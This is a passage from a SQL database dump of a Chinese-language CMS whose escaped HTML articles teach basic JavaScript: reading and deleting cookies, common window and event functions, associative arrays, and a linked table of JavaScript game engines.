escape()&lt;/span&gt;，那获取&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;时也不用&lt;span lang=&quot;EN-US&quot;&gt; unescape()&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p&gt;　　再来一次：编写一个函数，作用是查找指定&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的值。&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;function getCookie(cookieName) {&lt;br /&gt;\r\n&amp;nbsp; var cookieString = document.cookie;&lt;br /&gt;\r\n&amp;nbsp; var start = cookieString.indexOf(cookieName + ''='');&lt;br /&gt;\r\n&amp;nbsp; // &lt;/span&gt;加上等号的原因是避免在某些&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的值里有&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; // &lt;/span&gt;与&lt;span lang=&quot;EN-US&quot;&gt; cookieName &lt;/span&gt;一样的字符串。&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp; if (start == -1) // &lt;/span&gt;找不到&lt;span lang=&quot;EN-US&quot;&gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return null;&lt;br /&gt;\r\n&amp;nbsp; start += cookieName.length + 1;&lt;br /&gt;\r\n&amp;nbsp; var end = cookieString.indexOf('';'', start);&lt;br /&gt;\r\n&amp;nbsp; if (end == -1) return unescape(cookieString.substring(start));&lt;br /&gt;\r\n&amp;nbsp; return unescape(cookieString.substring(start, end));&lt;br /&gt;\r\n}&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;这个函数用到了字符串对象的一些方法，如果你不记得了（你是不是这般没记性啊），请快去查查。这个函数所有的&lt;span lang=&quot;EN-US&quot;&gt; if &lt;/span&gt;语句都没有带上&lt;span lang=&quot;EN-US&quot;&gt; else&lt;/span&gt;，这是因为如果条件成立，程序运行的都是&lt;span lang=&quot;EN-US&quot;&gt; return &lt;/span&gt;语句，在函数里碰上&lt;span lang=&quot;EN-US&quot;&gt; return&lt;/span&gt;，就会终止运行，所以不加&lt;span lang=&quot;EN-US&quot;&gt; else &lt;/span&gt;也没问题。该函数在找到&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;时，就会返回&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;的值，否则返回“&lt;span lang=&quot;EN-US&quot;&gt;null&lt;/span&gt;”。&lt;/p&gt;\r\n&lt;p&gt;　　现在我们要删除刚才设定的&lt;span lang=&quot;EN-US&quot;&gt; name=rose Cookie&lt;/span&gt;。&lt;/p&gt;\r\n&lt;p&gt;&lt;span lang=&quot;EN-US&quot;&gt;var expires = new Date();&lt;br /&gt;\r\nexpires.setTime(expires.getTime() - 1);&lt;br /&gt;\r\ndocument.cookie = ''name=rose;expires='' + expires.toGMTString();&lt;/span&gt;&lt;/p&gt;\r\n&lt;p&gt;可以看到，只需要把失效日期改成比现在日期早一点（这里是早&lt;span lang=&quot;EN-US&quot;&gt; 1 &lt;/span&gt;毫秒），再用同样的方法设定&lt;span lang=&quot;EN-US&quot;&gt; Cookie&lt;/span&gt;，就可以删掉&lt;span lang=&quot;EN-US&quot;&gt; Cookie &lt;/span&gt;了。&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;o :p&gt;&amp;nbsp;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1303135475, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(70, 1, 'js常用js函数和方法', '', '', '&lt;div&gt;1.window.external.AddFavorite('' '', ''希望网络技术站'') 提示把网站加入收藏夹&lt;/div&gt;\r\n&lt;div&gt;onload=favorate() 要加在标签处，如：&lt;/div&gt;\r\n&lt;div&gt;※ 如果你想在离开网页时提示加为收藏夹，只需要把&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;onunload=favorate() 改成 onload=favorate() 即可&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;2.function document.oncontextmenu()// 禁止鼠标右键；&lt;/div&gt;\r\n&lt;div&gt;3.function document.onselectstart()// 禁止选取&lt;/div&gt;\r\n&lt;div&gt;4.Window .open()是打开一个新窗口。&lt;/div&gt;\r\n&lt;div&gt;基本格式为：Window .open(&quot;URL&quot;,&quot;窗口名字&quot;,&quot;窗口属性&quot;)&lt;/div&gt;\r\n&lt;div&gt;window属性参数是由一个字符串列表项它由逗号分隔，它指明了有关新创建窗口的属性。&lt;/div&gt;\r\n&lt;div&gt;参 数 &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;设定值 &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;含 义&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;toolbar &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立标准工具条&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;location &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立位置输入字段&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;directions &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立标准目录按钮&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;status &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立状态条&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;menubar &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立菜单条&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;scrollbar &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;建立或不建立滚动条&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;revisable &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;能否改变窗口大小&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;width &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;确定窗口的宽度&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Height &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;yes/no &lt;span class=&quot;Apple-tab-span&quot; style=&quot;white-space:pre;&quot;&gt;	&lt;/span&gt;确定窗口的高度。&lt;/div&gt;\r\n&lt;div&gt;5.cursor:样式 &amp;nbsp; 更改鼠标样式 &amp;nbsp; hand &amp;nbsp; crosshair &amp;nbsp; text &amp;nbsp; wait &amp;nbsp; help&lt;/div&gt;\r\n&lt;div&gt;6.event.clientX &amp;nbsp; 返回最后一次点击鼠标X坐标值； &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp;event.clientY &amp;nbsp; 返回最后一次点击鼠标Y坐标值； &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp;event.offsetX &amp;nbsp; 返回当前鼠标悬停X坐标值 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp;event.offsetY &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;7.JS中的窗口重定向:window.navigate(&quot;http://www.google.com&quot;); &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;8.添加打印机：window.print() ;&lt;/div&gt;\r\n&lt;div&gt;9.window.location.reload()刷新当前页面.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;10.window.history.back()返回上一页,window.history.forward()返回下一页,window.history.go(返回第几页,也可以使用访问过的URL)&lt;/div&gt;\r\n&lt;div&gt;11.onClick &amp;nbsp; 当对象被点击 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;12.onLoad &amp;nbsp; 当网页打开,只能书写在body中 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;13.onUnload &amp;nbsp; 当网页关闭或离开时,只能书写在body中 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;14.onmouseover &amp;nbsp; 当鼠标悬于其上时 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;15.onmouseout &amp;nbsp; 当鼠标离开对象时 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;16.onmouseup &amp;nbsp; 当鼠标松开 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;17.onmousedown &amp;nbsp; 当鼠标按下键 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;18.onFocus &amp;nbsp; 当对象获取焦点时 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;19.onSelect &amp;nbsp; 当对象的文本被选中时 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;20.onChange &amp;nbsp; 当对象的内容被改变 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;21.onBlur &amp;nbsp; 当对象失去焦点 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;81.JS中的窗口滚动条:window.scroll(x,y) &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;82.JS中的窗口滚动到位置:window.scrollby &amp;nbsp;&lt;/div&gt;\r\n', 1, 1, 0, 0, 1303137221, 1, 'admin'),
(71, 1, 'JS关联数组', '', '', '&lt;div&gt;数组分类：&lt;/div&gt;\r\n&lt;div&gt;1、从数组的下标分为索引数组、关联数组&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;/* 索引数组，即通常情况下所说的数组 */ &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var ary1 = [1,3,5,8]; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;//按索引去取数组元素，从0开始（当然某些语言实现从1开始），索引实际上就是序数，一个整型数字 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;alert(ary1[0]); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;alert(ary1[1]); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;alert(ary1[2]); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;alert(ary1[3]); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;/* 关联数组，指以非序数类型为下标来存取的数组 &amp;nbsp;python中称为字典 */ &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var ary2 = {}; &amp;nbsp; //存取时，以非序数（数字），这里是字符串 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2[&quot;one&quot;] = 1; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2[&quot;two&quot;] = 2; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2[&quot;thr&quot;] &amp;nbsp;= 3; &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2[&quot;fou&quot;] = 4;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;2、从对数据的存储分为静态数组、动态数组&lt;/div&gt;\r\n&lt;div&gt;/* java中的静态数组 */ &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;Int[] ary1 = {1,3,6,9}; //定义后数组的长度固定了不能改变，按索引取数组元素 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;/* java中的动态数组 &amp;nbsp; （java中的ArrayList实现是以Array为基础的。）*/ &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;List&amp;lt;Integer&amp;gt; ary2 = new ArrayList&amp;lt;Integer&amp;gt;(); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2.add(1);//可以动态的添加元素，数组的长度也随着变化 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2.add(3); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary2.add(6);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;/* js的数组属于动态数组 */ &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var ary = [];//定义一个数组，未指定长度 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary[0] = 1;//可以动态的添加元素 &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary.push(3); &amp;nbsp;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;ary.push(5); &amp;nbsp; &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;alert(ary.join(&quot;,&quot;));//输出1,3,5 &amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;div&gt;js的数组同时属于索引数组和动态数组，因为本质上它就是一个js对象，体现着js动态语言特性。但js的索引数组并非“连续分配”内存的，因此索引方法并不会带来很高的效率。而java中的数组则是连续分配内存的。&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1303137573, 1, 'admin'),
(72, 1, 'js游戏引擎大全', '', '', '&lt;h4&gt;游戏引擎&lt;/h4&gt;\r\n&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th align=&quot;left&quot;&gt;Name&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Latest Release&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;License&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Type&lt;/th&gt;\r\n&lt;th align=&quot;left&quot;&gt;Notes&lt;/th&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://renderengine.com/&quot; target=&quot;_blank&quot;&gt;The Render Engine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.5.3&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;跨浏览器; 大规模 API; 开源.&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://renderengine.com/features.php&quot; target=&quot;_blank&quot;&gt;2&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://gamequery.onaluf.org/&quot; target=&quot;_blank&quot;&gt;gameQuery&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.5.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;CC BY-SA 2.5&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;和 jQuery 一起使用&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://game.tyler-dewitt.com/&quot; target=&quot;_blank&quot;&gt;gTile&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.0.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Tile based&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.kesiev.com/akihabara/&quot; target=&quot;_blank&quot;&gt;Akihabara&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.3&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL2/MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Classic Repro&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;基于JS+HTML5的街机风格的游戏&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/kesiev/akihabara&quot; target=&quot;_blank&quot;&gt;3&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.lukewallin.co.uk/?go=engine&quot; target=&quot;_blank&quot;&gt;The Javascript 2D Game Engine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;注重于重力、物理、碰撞检测方面，使用HTML5 Canvas 和IE的ExplorerCanvas 低CPU消耗.&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.lukewallin.co.uk/?go=engine&quot; target=&quot;_blank&quot;&gt;4&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://gogomakeplay.com/gmp&quot; target=&quot;_blank&quot;&gt;The GMP Javascript Game Engine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.7.4 (2010-10-31)&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL2/MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;注重于数度的操作简化，”easy to learn and use”&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://gogomakeplay.com/gmp&quot; target=&quot;_blank&quot;&gt;5&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://craftyjs.com/&quot; target=&quot;_blank&quot;&gt;Crafty&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;0.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL/MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;轻量级和模块化。&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://craftyjs.com/&quot; target=&quot;_blank&quot;&gt;6&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.effectgames.com/effect/&quot; target=&quot;_blank&quot;&gt;Effect Games&lt;/a&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.propulsionjs.com/&quot; target=&quot;_blank&quot;&gt;PropulsionJS&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.1&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;使用 HTML5 Canvas.&amp;nbsp;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.propulsionjs.com/&quot; target=&quot;_blank&quot;&gt;7&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://flax.ie/category/flax-game-engine/&quot; target=&quot;_blank&quot;&gt;Flax&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Apache 2.0&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;还没有released。使用 GWT 和 HTML5。关注于Linux和Mac OS上的Web游戏开发。&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://flax.ie/about/&quot; target=&quot;_blank&quot;&gt;8&lt;/a&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/giancarlo/j5g3&quot; target=&quot;_blank&quot;&gt;j5g3&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPLv3&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;还在开发过程中&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://sites.google.com/site/cssgameengine/&quot; target=&quot;_blank&quot;&gt;cssgameengine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;用于初学者。&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p&gt;&lt;/p&gt;\r\n&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://mccormick.cx/projects/jsGameSoup/&quot; target=&quot;_blank&quot;&gt;jsGameSoup&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;v74&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;LGPLv3&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.sean.co.uk/a/webdesign/javascript_gamelib/javascript_gamelib.shtm&quot; target=&quot;_blank&quot;&gt;Javascript Gamelib&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2.10&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.sarien.net/source&quot; target=&quot;_blank&quot;&gt;Sarien.net interpreter&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;GPL&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D Adventure&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://code.google.com/p/jgen/&quot; target=&quot;_blank&quot;&gt;jGen&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Isometric&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.isogenicengine.com/home/&quot; target=&quot;_blank&quot;&gt;Isogenic Engine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Isometric&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://gammajs.org/&quot; target=&quot;_blank&quot;&gt;GammaJS&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;1.0&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;MIT&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2.5D Platform&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.codeproject.com/KB/scripting/TomsHallsJavascriptGame.aspx&quot; target=&quot;_blank&quot;&gt;Tom’s Halls&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;3.0&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Platform&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;https://github.com/lostdecade/diggy&quot; target=&quot;_blank&quot;&gt;Diggy&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;BSD&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;基于 DHTML, 正在暂停中&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://impactjs.com/&quot; target=&quot;_blank&quot;&gt;Impact&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Commercial ($99)&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;2D&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://rocketpack.fi/engine/&quot; target=&quot;_blank&quot;&gt;Rocket Engine&lt;/a&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;&lt;/td&gt;\r\n&lt;td align=&quot;left&quot;&gt;Commercial&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;td&gt;&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td align=&quot;left&quot;&gt;&lt;a style=&quot;color:#2244bb;&quot; href=&quot;http://www.wonderlandblog.com/wonderland/2010/04/aves-an-html-javascript-game-engine.html&quot; target=&quot;_blank&quot;&gt;Aves&lt;/a&gt;&lt;/td&gt;\r\n&lt;td 